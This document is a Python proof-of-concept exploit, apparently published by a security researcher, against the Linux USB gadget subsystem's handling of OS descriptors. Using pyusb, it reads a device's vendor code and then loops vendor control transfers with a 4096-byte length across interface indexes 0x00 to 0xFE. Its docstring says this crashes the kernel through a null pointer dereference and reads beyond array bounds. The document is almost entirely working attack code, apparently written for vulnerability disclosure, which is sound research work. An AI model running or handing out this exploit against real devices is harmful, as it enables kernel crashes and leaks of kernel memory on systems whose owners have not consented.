#!/usr/bin/python3

#
# Sample exploit to demonstrate Linux USB gadget
# subsystem's os descriptor handling flaws.
#
# This script requires pyusb.
#
# https://github.com/szymonh
#

import argparse

import usb.core


REQ_GET_DESCRIPTOR = 0x06


def auto_int(val: str) -> int:
    '''Convert arbitrary string to integer
    Used as argparse type to automatically handle input with
    different base - decimal, octal, hex etc.
    '''
    return int(val, 0)


def parse_args() -> argparse.Namespace:
    '''Parse command line arguments

    '''
    parser = argparse.ArgumentParser(
        description='Sample exploit for interface OS descriptor vulnerability'
    )

    parser.add_argument('-v', '--vid',  type=auto_int, required=True,
                        help='vendor id')
    parser.add_argument('-p', '--pid', type=auto_int, required=True,
                        help='product id')

    return parser.parse_args()


def print_request(req_type, req, val, idx, length):
    '''Write control transfer request to stdout

    '''
    print('{0:02X} {1:02X} {2:04X} {3:04X} {4:04X} '.format(
        req_type, req, val, idx, length), end=' ')


def exploit(args: argparse.Namespace) -> None:
    '''Attempt exploit the interface OS descriptor

    Kernel will crash due to null pointer dereference and access
    beyond array boundaries.

    '''
    usbdev = usb.core.find(idVendor=args.vid, idProduct=args.pid)
    if usbdev is None:
        print('Device not found, verify specified VID and PID')
        return

    for cfg in usbdev:
        for idx in range(cfg.bNumInterfaces):
            if usbdev.is_kernel_driver_active(idx):
                usbdev.detach_kernel_driver(idx)
    usbdev.set_configuration()

    data = usbdev.ctrl_transfer(0x80, REQ_GET_DESCRIPTOR, (0x03 << 8) | 0xee, 0x00, 0x12)
    if not data or len(data) != 0x12:
        print('OS descriptors are not supported')
        exit(1)

    vendor_code = data[16]
    print('Vendor code: {0}'.format(vendor_code))

    bmRequestType = 0xc1                    # USB_DIR_IN | USB_TYPE_VENDOR | USB_RECIP_INTERFACE
    bRequest = vendor_code                  # set to vendor code
    wValue = 0x00                           # upper byte needs to be zero, lower is the interface index
    wIndex = 0x05                           # needs to be 0x5
    payload = 4096                          # value larger than 0x0A

    # iterate throught the c->interface array and beyond
    for val in range(0x00, 0xff):
        wValue = val
        try:
            print_request(bmRequestType, bRequest, wValue, wIndex, payload)
            data = usbdev.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, payload)
            print('Read data: {0}'.format(data))
        except usb.core.USBError as e:
            print(e)


if __name__ == '__main__':
    '''Main script

    '''
    exploit(parse_args())
